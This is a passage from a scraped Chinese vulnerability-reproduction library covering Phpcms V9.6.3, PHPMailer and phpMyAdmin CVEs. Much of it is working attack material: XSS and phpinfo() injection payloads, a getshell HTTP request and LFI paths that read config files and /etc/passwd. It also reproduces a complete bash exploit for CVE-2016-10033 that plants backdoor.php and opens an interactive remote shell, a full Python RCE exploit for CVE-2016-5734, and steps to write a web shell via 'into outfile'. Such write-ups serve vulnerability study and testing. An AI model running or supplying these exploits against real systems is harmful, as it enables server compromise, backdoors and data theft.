这里是进入数据库了：messagequeue::add('change_credit', $noticedata); public static function add($operation, $noticedata_send) { $db = self::get_db(); $noticedata_send['action'] = $operation; $noticedata_send_string = array2string($noticedata_send); if ($noticeid = $db->insert(array('operation'=>$operation, 'noticedata'=>$noticedata_send_string, 'dateline'=>SYS_TIME), 1)) { self::notice($operation, $noticedata_send, $noticeid); return 1; } else { return 0; } } 调用insert写入数据。。这里就不跟了。由于系统开启了gpc（两次，初始化一次，phpsso一次），所以进去的数据是经过两次gpc的输出跟模板就不说了，反正没过滤直接出来 整理一下思路，先从积分兑换填写表单，然后将数据整理成数组经过sys_auth加密一次，然后服务器发送数据包给自己，收到数据包之后用sys_auth函数解密，然后调用changecredit方法，inert插入数据库，然后管理员在后台点击通信信息的时候触发xss! 漏洞复现 利用方法，先注册一个帐号，然后登录，然后访问:http://www.0-sec.org/index.php?m=member&c=index&a=change\\_credit&post: dosubmit=1&fromvalue=0.6&from=1id=1`setset'&to=}\" onmousemove=alert(1)>// 参考链接 https://xz.aliyun.com/t/1860 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:48 "},"Web安全/Phpcms/Phpcms V9.6.3 前台getshell/Phpcms V9.6.3 前台getshell.html":{"url":"Web安全/Phpcms/Phpcms V9.6.3 前台getshell/Phpcms V9.6.3 前台getshell.html","title":"Phpcms V9.6.3 前台getshell","keywords":"","body":"Phpcms V9.6.3 前台getshell 一、漏洞简介 二、漏洞影响 Phpcms V9.6.3 三、复现过程 POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1 Host: www.0-sec.org Content-Length: 297 Cache-Control: max-age=0 Origin: http://www.0-sec.org Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Referer: http://www.0-sec.org/index.php?m=member&c=index&a=register&siteid=1 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.8,es;q=0.6,fr;q=0.4,vi;q=0.2 Cookie: PHPSESSID=h5jo0216vveqr9blnh146tq5q5 X-Forwarded-For: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Originating-IP: 127.0.0.1 Connection: close siteid=1&modelid=2&username=520520&password=5205201&pwdconfirm=5205201&email=52052096%40163.com&nickname=52096&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=&info[content]= Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:49 "},"Web安全/Phpcms/Phpcms V9.6.3 后台远程命令执行漏洞/Phpcms V9.6.3 后台远程命令执行漏洞.html":{"url":"Web安全/Phpcms/Phpcms V9.6.3 后台远程命令执行漏洞/Phpcms V9.6.3 后台远程命令执行漏洞.html","title":"Phpcms V9.6.3 后台远程命令执行漏洞","keywords":"","body":"Phpcms V9.6.3 后台远程命令执行漏洞 一、漏洞简介 二、漏洞影响 Phpcms V9.6.3 三、复现过程 漏洞分析 漏洞代码位于 /phpcms/modules/admin/menu.php 第 81 行 function edit() { if(isset($_POST['dosubmit'])) { $id = intval($_POST['id']); //print_r($_POST['info']);exit; $r = $this->db->get_one(array('id'=>$id)); $this->db->update($_POST['info'],array('id'=>$id)); //修改语言文件 $file = PC_PATH.'languages'.DIRECTORY_SEPARATOR.'zh-cn'.DIRECTORY_SEPARATOR.'system_menu.lang.php'; require $file; $key = $_POST['info']['name']; if(!isset($LANG[$key])) { $content = file_get_contents($file); $content = substr($content,0,-2); $data = $content.\"\\$LANG['$key'] = '$_POST[language]';\\r\\n?>\"; file_put_contents($file,$data); } elseif(isset($LANG[$key]) && $LANG[$key]!=$_POST['language']) { $content = file_get_contents($file); $content = str_replace($LANG[$key],$_POST['language'],$content); file_put_contents($file,$content); } $this->update_menu_models($id, $r, $_POST['info']); //结束语言文件修改 showmessage(L('operation_success')); } else { . . . . . . } } 这段代码是修改语言文件用的，而这个语言文件就是 /phpcms/languages/zh-cn/system_menu.lang.php 里面一堆类似 $LANG['video'] = '视频'; 的东西 当时用 rips 扫描发现的大多是 $data = $content.\"\\$LANG['$key'] = '$_POST[language]';\\r\\n?>\"; 这种拼接操作，而且 POST 中的单引号会被转义，无法逃逸 转义代码位于 /phpcms/libs/classes/param.class.php public function __construct() { if(!get_magic_quotes_gpc()) { $_POST = new_addslashes($_POST); $_GET = new_addslashes($_GET); $_REQUEST = new_addslashes($_REQUEST); $_COOKIE = new_addslashes($_COOKIE); } } 而这里突然看到一个 str_replace ， str_replace($LANG[$key],$_POST['language'],$content)，感觉可能会有漏洞 一番胡乱测试之后惊奇的发现网站 500 了，细看原来是单引号逃逸导致报错 下面是漏洞分析过程 首先要登录后台拿到 pc_hash 的值，这个是防止提交恶意数据的，后台首页 F12 就能看到 然后访问： http://www.0-sec.org:9000/index.php?m=admin&c=menu&a=edit&pc_hash=wCuF7w phpcms 的路由和那个 yzmcms 差不多，m 是模块名，对应 /phpcms 下的文件夹，c 是控制器名，对应 /phpcms/模块/ 下的 php 文件名，a 则对应控制器类的类函数名 发送 POST 请求： dosubmit=1&info[name]=1&language=1 语言文件最后会新添内容 $LANG['1'] = '1'; 第一次请求 发送 POST 请求： dosubmit=1&info[name]=1&language=1' require $file; 引入语言文件，$LANG[$key] 的值还是 NULL，所以执行拼接操作 $data = $content.\"\\$LANG['$key'] = '$_POST[language]';\\r\\n?>\"; file_put_contents($file,$data); 得到语言文件新添内容为 $LANG['1'] = '1\\''; ?> 第二次请求 发送与第一次相同的 POST 请求 require $file; 引入语言文件得到 $LANG[$key] 的值是 string(2) \"1'\"，也就是说，没有反斜杠，这样问题就出现了，我们同样的请求发送了两次，按照代码逻辑来看，是不应该更新 $LANG[$key] 的值的 但是因为 require 和 file_get_contents 函数读取之后的文件内容不含反斜杠，而我们 POST 传入的 language 会被转义处理得到的值是 string(3) \"1\\'\" 于是判断 $LANG[$key]!=$_POST['language'] 就成立了，接着 str_replace 函数进行字符串替换操作，把原来的 $LANG['1'] = '1\\''; 中的 1' 替换成 1\\'，最终写入文件 结果就得到了以下文件内容，第二个单引号被反斜杠转义，无法闭合 $LANG['1\\'] = '1\\''; ?> payload: 发送两次以下请求，访问语言文件 http://www.0-sec.org:9000/phpcms/languages/zh-cn/system\\_menu.lang.php 即可得到 phpinfo URL: http://www.0-sec.org:9000/index.php?m=admin&c=menu&a=edit&pc_hash=wCuF7w POST: dosubmit=1&info[name]=];phpinfo();//1&language=];phpinfo();//1' 参考链接 http://j0k3r.top/2019/10/09/phpcmsv9.6.3\\_background\\_rce/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:51 "},"Web安全/Phpcms/Phpcms V9.6.3 文件包含漏洞/Phpcms V9.6.3 文件包含漏洞.html":{"url":"Web安全/Phpcms/Phpcms V9.6.3 文件包含漏洞/Phpcms V9.6.3 文件包含漏洞.html","title":"Phpcms V9.6.3 文件包含漏洞","keywords":"","body":"Phpcms V9.6.3 文件包含漏洞 一、漏洞简介 二、漏洞影响 Phpcms V9.6.3 三、复现过程 http://www.0-sec.org/m=search&a=public_get_suggest_keyword&q=../../phpsso_server/caches/configs/database.php Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:52 "},"Web安全/PHPMailer/（CVE-2016-10033）PHPMailer  5.2.18 远程命令执行漏洞/（CVE-2016-10033）PHPMailer  5.2.18 远程命令执行漏洞.html":{"url":"Web安全/PHPMailer/（CVE-2016-10033）PHPMailer  5.2.18 远程命令执行漏洞/（CVE-2016-10033）PHPMailer  5.2.18 远程命令执行漏洞.html","title":"（CVE-2016-10033）PHPMailer  5.2.18 远程命令执行漏洞","keywords":"","body":"（CVE-2016-10033）PHPMailer \\ 一、漏洞简介 PHPMailer 5.2.18之前的版本存在一个漏洞，该漏洞可能导致远程代码执行（RCE）。如果未设置Sender属性，则PHPMailer的isMail传输中的mailSend函数可能会允许远程攻击者将额外的参数传递给mail命令，从而通过在预制的发件人地址中使用\"（反斜杠双引号）执行任意代码。 二、漏洞影响 PHPMailer \\ 三、复现过程 poc root@kali:~/CVE-2016-10033# ./exploit.sh www.0-sec.org:8080 [+] CVE-2016-10033 exploit by opsxcq [+] Exploiting www.0-sec.org:8080 [+] Target exploited, acessing shell at http://www.0-sec.org:8080/backdoor.php [+] Checking if the backdoor was created on target system [+] Backdoor.php found on remote system [+] Running whoami www-data RemoteShell> ls [+] Running ls vulnerable RemoteShell> pwd [+] Running pwd /www CVE-2016-10033.sh #!/bin/bash # CVE-2016-10033 exploit by opsxcq # https://github.com/opsxcq/exploit-CVE-2016-10033 echo '[+] CVE-2016-10033 exploit by opsxcq' if [ -z \"$1\" ] then echo '[-] Please inform an host as parameter' exit -1 fi if [ $(uname) == 'Darwin' ] then decoder='base64 -D' elif [ $(uname) == 'Linux' ] then decoder='base64 -d' else echo '[-] Your platform isnt supported: '$(uname) exit -1 fi host=$1 echo '[+] Exploiting '$host curl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"action\"\\r\\n\\r\\nsubmit\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"name\"\\r\\n\\r\\n\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"email\"\\r\\n\\r\\n\\\"vulnerables\\\\\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\\\" @test.com\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"message\"\\r\\n\\r\\nPwned\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\\r\\n' >/dev/null && echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php' echo '[+] Checking if the backdoor was created on target system' code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\\n' \"http://$host/backdoor.php\") if [ \"$code\" != \"200\" ] then echo '[-] Target cant be exploited' exit -1 else echo '[+] Backdoor.php found on remote system' fi cmd='whoami' while [ \"$cmd\" != 'exit' ] do echo '[+] Running '$cmd if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder then echo '[-] Connection problens' exit -1 fi echo read -p 'RemoteShell> ' cmd done echo '[+] Exiting' Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:53 "},"Web安全/PHPMailer/（CVE-2017-5223）PHPMailer = 5.2.21 任意文件读取漏洞/（CVE-2017-5223）PHPMailer = 5.2.21 任意文件读取漏洞.html":{"url":"Web安全/PHPMailer/（CVE-2017-5223）PHPMailer = 5.2.21 任意文件读取漏洞/（CVE-2017-5223）PHPMailer = 5.2.21 任意文件读取漏洞.html","title":"（CVE-2017-5223）PHPMailer = 5.2.21 任意文件读取漏洞","keywords":"","body":"（CVE-2017-5223）PHPMailer \\ 一、漏洞简介 PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（），并将其src属性的值提取出来作为附件。所以，如果我们能控制部分邮件内容，可以利用将文件/etc/passwd作为附件读取出来，造成任意文件读取漏洞。 二、漏洞影响 PHPMailer \\ 三、复现过程 \"意见反馈\"页面，正常用户填写昵称、邮箱、意见提交，这些信息将被后端储存，同时后端会发送一封邮件提示用户意见填写完成： PHPMailer 该场景在实战中很常见，比如用户注册网站成功后，通常会收到一封包含自己昵称的通知邮件，那么，我们在昵称中插入恶意代码``，目标服务器上的文件将以附件的形式被读取出来。 同样，我们填写恶意代码在\"意见\"的位置： PHPMailer 收到邮件，其中包含附件/etc/passwd和/etc/hosts： PHPMailer 下载读取即可。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:00:54 "},"Web安全/Phpmyadmin/（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞/（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞.html":{"url":"Web安全/Phpmyadmin/（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞/（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞.html","title":"（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞","keywords":"","body":"（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞 一、漏洞简介 二、漏洞影响 phpMyAdmin 4 .0.1--4 .2.12PHP version \\ 三、复现过程 /gis_data_editor.php?token=2941949d3768c57b4342d94ace606e91&gis_data[gis_type]= /../../../../phpinfo.txt%00 # 注意改下token值 在实际利用中可以利用写入文件到 /tmp 目录下结合此漏洞完成 RCE，php 版本可以通过 http header、 导出表内容到文件的附加内容看到。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:00 "},"Web安全/Phpmyadmin/（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞/（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞.html":{"url":"Web安全/Phpmyadmin/（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞/（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞.html","title":"（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞","keywords":"","body":"（CVE-2016-5734）Phpmyadmin 后台远程命令执行漏洞 一、漏洞简介 在PHP5.4.7以前，preg_replace的第一个参数可以利用\\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。 二、漏洞影响 4.0.10.16之前4.0.x版本4.4.15.7之前4.4.x版本4.6.3之前4.6.x版本（实际上由于该版本要求PHP5.5+，所以无法复现本漏洞） 三、复现过程 这个功能需要登录，且能够写入数据。 因为目标环境使用root，所以我们可以创建一个临时数据库和数据表，进行漏洞利用。这里，我们使用POC来复现漏洞。 ./cve-2016-5734.py -c 'system(id);' -u root -p root -d test http://www.0-sec.org:8080/ Phpmyadmin后台远程命令执行漏洞/media/rId24.png) -d是已经可以写的数据库，-c是待执行的PHP语句，如果没有指定表名，这个POC会创建一个名为prgpwn的表。 poc #!/usr/bin/env python \"\"\"cve-2016-5734.py: PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit Details: Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7. CVE: CVE-2016-5734 Author: https://twitter.com/iamsecurity run: ./cve-2016-5734.py -u root --pwd=\"\" http://localhost/pma -c \"system('ls -lua');\" \"\"\" import requests import argparse import sys __author__ = \"@iamsecurity\" if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument(\"url\", type=str, help=\"URL with path to PMA\") parser.add_argument(\"-c\", \"--cmd\", type=str, help=\"PHP command(s) to eval()\") parser.add_argument(\"-u\", \"--user\", required=True, type=str, help=\"Valid PMA user\") parser.add_argument(\"-p\", \"--pwd\", required=True, type=str, help=\"Password for valid PMA user\") parser.add_argument(\"-d\", \"--dbs\", type=str, help=\"Existing database at a server\") parser.add_argument(\"-T\", \"--table\", type=str, help=\"Custom table name for exploit.\") arguments = parser.parse_args() url_to_pma = arguments.url uname = arguments.user upass = arguments.pwd if arguments.dbs: db = arguments.dbs else: db = \"test\" token = False custom_table = False if arguments.table: custom_table = True table = arguments.table else: table = \"prgpwn\" if arguments.cmd: payload = arguments.cmd else: payload = \"system('uname -a');\" size = 32 s = requests.Session() # you can manually add proxy support it's very simple ;) # s.proxies = {'http': \"127.0.0.1:8080\", 'https': \"127.0.0.1:8080\"} s.verify = False sql = '''CREATE TABLE `{0}` ( `first` varchar(10) CHARACTER SET utf8 NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1; INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500')); '''.format(table) # get_token resp = s.post(url_to_pma + \"/?lang=en\", dict( pma_username=uname, pma_password=upass )) if resp.status_code is 200: token_place = resp.text.find(\"token=\") + 6 token = resp.text[token_place:token_place + 32] if token is False: print(\"Cannot get valid authorization token.\") sys.exit(1) if custom_table is False: data = { \"is_js_confirmed\": \"0\", \"db\": db, \"token\": token, \"pos\": \"0\", \"sql_query\": sql, \"sql_delimiter\": \";\", \"show_query\": \"0\", \"fk_checks\": \"0\", \"SQL\": \"Go\", \"ajax_request\": \"true\", \"ajax_page_request\": \"true\", } resp = s.post(url_to_pma + \"/import.php\", data, cookies=requests.utils.dict_from_cookiejar(s.cookies)) if resp.status_code == 200: if \"success\" in resp.json(): if resp.json()[\"success\"] is False: first = resp.json()[\"error\"][resp.json()[\"error\"].find(\"\")+6:] error = first[:first.find(\"\")] if \"already exists\" in error: print(error) else: print(\"ERROR: \" + error) sys.exit(1) # build exploit exploit = { \"db\": db, \"table\": table, \"token\": token, \"goto\": \"sql.php\", \"find\": \"0/e\\0\", \"replaceWith\": payload, \"columnIndex\": \"0\", \"useRegex\": \"on\", \"submit\": \"Go\", \"ajax_request\": \"true\" } resp = s.post( url_to_pma + \"/tbl_find_replace.php\", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies) ) if resp.status_code == 200: result = resp.json()[\"message\"][resp.json()[\"message\"].find(\"\")+8:] if len(result): print(\"result: \" + result) sys.exit(0) print( \"Exploit failed!\\n\" \"Try to manually set exploit parameters like --table, --database and --token.\\n\" \"Remember that servers with PHP version greater than 5.4.6\" \" is not exploitable, because of warning about null byte in regexp\" ) sys.exit(1) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:01 "},"Web安全/Phpmyadmin/（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞/（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞.html":{"url":"Web安全/Phpmyadmin/（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞/（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞.html","title":"（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞","keywords":"","body":"（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞 一、漏洞简介 二、漏洞影响 phpMyAdmin 4.8.0和4.8.1受到影响。 三、复现过程 首先需要登录phpmyadmin payload http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../phpStudy/使用说明.txt Phpmyadmin远程文件包含漏洞/media/rId25.png) 写入shell 第一种姿势 1、写入shell，测试语句： SELECT '' Phpmyadmin远程文件包含漏洞/media/rId29.png) 2、查看自己的sessionid（cookie中phpMyAdmin的值）。(或者Bp抓包获取本地的cookie值也可以) Phpmyadmin远程文件包含漏洞/media/rId31.png) 补充代码 如果上述方法不行的话，则用以下代码 select '' into outfile '/var/www/shell.php' 3、访问： http://0-sec.org/index.php?target=db_sql.php%253f/../../../../../../../../phpStudy/tmp/tmp/sess_20f18hqcr2mc0nmq96vp920r6phc06v3 第二种姿势 1、在数据表里面添加一句话(这里一点要用get！) Phpmyadmin远程文件包含漏洞/media/rId36.png) 2、此时会在phpStudyMySQLdata 对应数据库下生成一个frm文件（不同版本路径可能不一样） Phpmyadmin远程文件包含漏洞/media/rId38.png) 3、访问 http://0-sec.org/index.php?9ouu=phpinfo();&target=db_sql.php%253f/../../../../../../phpStudy/MySQL/data/9ouu/test.frm image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:08 "},"Web安全/Phpmyadmin/（CVE-2018-19968）Phpmyadmin 文件包含漏洞/（CVE-2018-19968）Phpmyadmin 文件包含漏洞.html":{"url":"Web安全/Phpmyadmin/（CVE-2018-19968）Phpmyadmin 文件包含漏洞/（CVE-2018-19968）Phpmyadmin 文件包含漏洞.html","title":"（CVE-2018-19968）Phpmyadmin 文件包含漏洞","keywords":"","body":"（CVE-2018-19968）Phpmyadmin 文件包含漏洞 一、漏洞简介 Transformation是phpMyAdmin中的一个高级功能，通过Transformation可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段 'Filename'，正常情况下 phpMyAdmin 只会将路径显示出来。但是通过Transformation我们可以将该字段转换成超链接，我们就能直接在 phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。 通常情况下Transformation的规则存储在每个数据库的pma__column_info表中，而在phpMyAdmin 4.8.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。 二、漏洞影响 Phpmyadmin 4.8.0~4.8.3 三、复现过程 1、首先登陆进后台，这里默认是root, toor Phpmyadmin文件包含漏洞/media/rId24.png) 2、创建数据库，并将PHP代码写入SESSION文件中 CREATE DATABASE foo; CREATE TABLE foo.bar ( baz VARCHAR(100) PRIMARY KEY ); INSERT INTO foo.bar SELECT ''; 访问http://www.0-sec.org/chk_rel.php?fixall_pmadb=1&db=foo在数据库foo中生成phpMyAdmin的配置表。 Phpmyadmin文件包含漏洞/media/rId26.png) 将篡改后的Transformation数据插入表pma_columninfo中将sess中的替换成你的会话ID，即COOKIE中phpMyAdmin的值，抓包查看session id，如下 Phpmyadmin文件包含漏洞/media/rId27.png) INSERT INTO pma__column_info SELECT '1', 'foo', 'bar', 'baz', 'plop', 'plop', 'plop', 'plop', '../../../../../../../../tmp/sess_***','plop'; \\#将sess_***中的***替换成你的会话ID，即COOKIE中phpMyAdmin的值 Phpmyadmin文件包含漏洞/media/rId28.png) 然后访问 http://www.0-sec.org/tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name%5Bmulti_edit%5D%5B%5D%5B%5D=baz&clause_is_unique=1 就能自动包含刚才插入数据库表的恶意代码 Phpmyadmin文件包含漏洞/media/rId30.shtml) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:11 "},"Web安全/Phpmyadmin/（CVE-2019-12616）Phpmyadmin CSRF/（CVE-2019-12616）Phpmyadmin CSRF.html":{"url":"Web安全/Phpmyadmin/（CVE-2019-12616）Phpmyadmin CSRF/（CVE-2019-12616）Phpmyadmin CSRF.html","title":"（CVE-2019-12616）Phpmyadmin CSRF","keywords":"","body":"（CVE-2019-12616）Phpmyadmin CSRF 一、漏洞简介 4.9.0之前在phpmyadmin中发现了一个问题。发现一个漏洞，允许攻击者对phpMyAdmin用户触发CSRF攻击。攻击者可以欺骗用户。 例如通过指向受害者的phpMyAdmin数据库的一个损坏的标记，并且攻击者可以潜在地将有效负载（例如特定的插入或删除语句）传递给受害者。 二、漏洞影响 Phpmyadmin \\ 三、复现过程 GET http://www.0-sec.org:9000/tbl_sql.php?sql_query=INSERT+INTO+%60pma__bookmark%60+(%60id%60%2C+%60dbase%60%2C+%60user%60%2C+%60label%60%2C+%60query%60)+VALUES+(DAYOFWEEK(%27%27)%2C+%27%27%2C+%27%27%2C+%27%27%2C+%27%27)&show_query=1&db=phpmyadmin&table=pma__bookmark HTTP/1.1 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Connection: keep-alive Cookie: pmaCookieVer=5; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci; pmaUser-1=%7B%22iv%22%3A%22M16ZzlA0rqF9BZ1jFsssjQ%3D%3D%22%2C%22mac%22%3A%22804941d12fceca0997e181cbcb8427d68c668240%22%2C%22payload%22%3A%22mD9juTxAYhC7lA7XPWHWOw%3D%3D%22%7D; phpMyAdmin=9bdd66557e399fc1447bf253bc2dc133 Upgrade-Insecure-Requests: 1 Host: localhost:9000 攻击者可以很容易地创建一个假超链接，其中包含希望代表用户执行的请求，这样就可能由于错误地使用http方法而导致csrf攻击 #POC POC CVE-2019-12616 View my Pictures! Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:13 "},"Web安全/Phpmyadmin/（CVE-2019-18622）Phpmyadmin xss/（CVE-2019-18622）Phpmyadmin xss.html":{"url":"Web安全/Phpmyadmin/（CVE-2019-18622）Phpmyadmin xss/（CVE-2019-18622）Phpmyadmin xss.html","title":"（CVE-2019-18622）Phpmyadmin xss","keywords":"","body":"（CVE-2019-18622）Phpmyadmin xss 一、漏洞简介 官方公布的是sql注入漏洞，但是实际是xss漏洞 二、漏洞影响 Phpmyadmin \\ 三、复现过程 漏洞分析 首先看官方修复的方式： Phpmyadminxss/media/rId25.png) 如上图，先关注/js/designer/move.js文件，可以看到单纯的修改了取值方式，最终的值通过POST 方式提交到db_desingner.php文件，关键内容如下： if (isset($_POST['dialog'])) { .... } elseif ($_POST['dialog'] == 'add_table') { // Pass the db and table to the getTablesInfo so we only have the table we asked for $script_display_field = $designerCommon->getTablesInfo($_POST['db'], $_POST['table']); ... } 传到了getTablesInfo()函数中，该函数内容主要如下： public function getTablesInfo($db = null, $table = null) { ..... foreach ($tables as $one_table) { $DF = $this->relation->getDisplayField($db, $one_table['TABLE_NAME']); $DF = is_string($DF) ? $DF : ''; $DF = ($DF !== '') ? $DF : null; $designerTables[] = new DesignerTable( $db, $one_table['TABLE_NAME'], $one_table['ENGINE'], $DF ); } return $designerTables; } 跟进getDisplayField()，内容如下： public function getDisplayField($db, $table) { $cfgRelation = $this->getRelationsParam(); /** * Try to fetch the display field from DB. */ if ($cfgRelation['displaywork']) { $disp_query = ' SELECT `display_field` FROM ' . Util::backquote($cfgRelation['db']) . '.' . Util::backquote($cfgRelation['table_info']) . ' WHERE `db_name` = \\'' . $GLOBALS['dbi']->escapeString($db) . '\\' AND `table_name` = \\'' . $GLOBALS['dbi']->escapeString($table) . '\\''; $row = $GLOBALS['dbi']->fetchSingleRow( $disp_query, 'ASSOC', DatabaseInterface::CONNECT_CONTROL ); if (isset($row['display_field'])) { return $row['display_field']; } } .... 通过escapeString过滤 table 名，查看该过滤函数： public function escapeString($link, $str) { return mysql_real_escape_string($str, $link); } 引入了mysql_real_escape_string()函数 这个函数类似于addslashes()函数，当编码不当的时候，可能导致宽字节注入 但真的那么简单吗？继续往下看 这里获得的table_name 参数会传入以下语句： SELECT *, `COLUMN_NAME` AS `Field`, `COLUMN_TYPE` AS `Type`, `COLLATION_NAME` AS `Collation`, `IS_NULLABLE` AS `Null`, `COLUMN_KEY` AS `Key`, `COLUMN_DEFAULT` AS `Default`, `EXTRA` AS `Extra`, `PRIVILEGES` AS `Privileges`, `COLUMN_COMMENT` AS `Comment` FROM `information_schema`.`COLUMNS` WHERE `TABLE_SCHEMA` = 'day1' AND `TABLE_NAME` = '$table_name'; 这里的$table_name在 db_designer.php中可控，然而当环境准备好，语句配置好后，却出现了以下错误： Phpmyadminxss/media/rId26.png) JSON encoding failed: Malformed UTF-8 characters, possibly incorrectly encoded 提示是因为编码问题，因此我们重新将 payload url 编码后再传入： Phpmyadminxss/media/rId27.png) 这次无误，查看执行的语句： Phpmyadminxss/media/rId28.png) %df%27并没有按照我们想法闭合单引号，到底是什么原因呢？ Phpmyadminxss/media/rId29.png) 在数据库连接的时候，phpmyadmin会将默认的字符格式设置为 utf8mb4，而我们宽字节注入必须要求编码为g bk，因此其实这里不存在宽字节注入。 说明这里的修复对SQL 漏洞并无多大关系（其实从修复文件上看，就知道了），继续看下一处修复。 /templates/database/designer/database_tables.twig处 diff 如下： - {{ designerTable.getTableName()|raw }} + {{ designerTable.getTableName() }} 可以看到，唯一的差别就是删除了|raw，这种写法是Twig模板语言的写法，raw 的作用就是让数据在 autoescape过滤器里失效，可以安装一个 twig 模板看看实例。 composer require \"twig/twig:^3.0\" Phpmyadminxss/media/rId30.png) 运行命令后该目录下会生成2个文件：composer.json、composer.lock以及一个目录vendor 然后在同目录下创建文件夹templates、tmp 进入templates目录下创建index.html.twig文件，内容如下 twig test {{ name |raw}} {{ name }} 根目录下创建index.php，内容如下： require_once 'vendor/autoload.php'; $loader = new \\Twig\\Loader\\FilesystemLoader('templates'); $twig = new \\Twig\\Environment($loader, [ 'cache' => '/Library/WebServer/Documents/twig/tmp', ]); echo $twig->render('index.html.twig', ['name' => 'panda\\' union select 1,2, from a']); 访问index.php可以发现： Phpmyadminxss/media/rId31.png) 单引号被转义成了实体字符 修复的 SQL 漏洞点在这里吗？ 并不是。这里修复的仅仅是前端显示字符串的问题，与后端的 sql 注入也并无关系。 前文中提到的move.js修复的也是前端的内容，其实也和后端的 sql 注入并无关系。 那么这个修复方式和 sql 注入到底是什么关系呢？ 可能没关系吧。 考虑到该修复内容全部为前端的内容，于是将表名改为 XSS 的 payload： alert(0) 果然，和当初想的一样，触发了 XSS 漏洞。 Phpmyadminxss/media/rId32.png) Phpmyadminxss/media/rId33.png) 然后看v4.9.2版本的 phpmyadmin： Phpmyadminxss/media/rId34.png) Phpmyadminxss/media/rId35.png) 转义成实体字符，无法触发 XSS Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:01:19 "},"Web安全/Phpmyadmin/（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞/（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞.html":{"url":"Web安全/Phpmyadmin/（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞/（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞.html","title":"（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞","keywords":"","body":"（CVE-2020-5504）Phpmyadmin 后台sql注入漏洞 一、漏洞简介 在用户帐户页面中发现了一个SQL注入漏洞。创建对此页面的查询时，恶意用户可能会注入自定义SQL来代替其自己的用户名。攻击者必须具有有效的MySQL帐户才能访问服务器。 二、漏洞影响 Phpmyadmin \\ Phpmyadmin \\ 三、复现过程 环境搭建 docker一把梭 docker run --name mysql5.6 -e 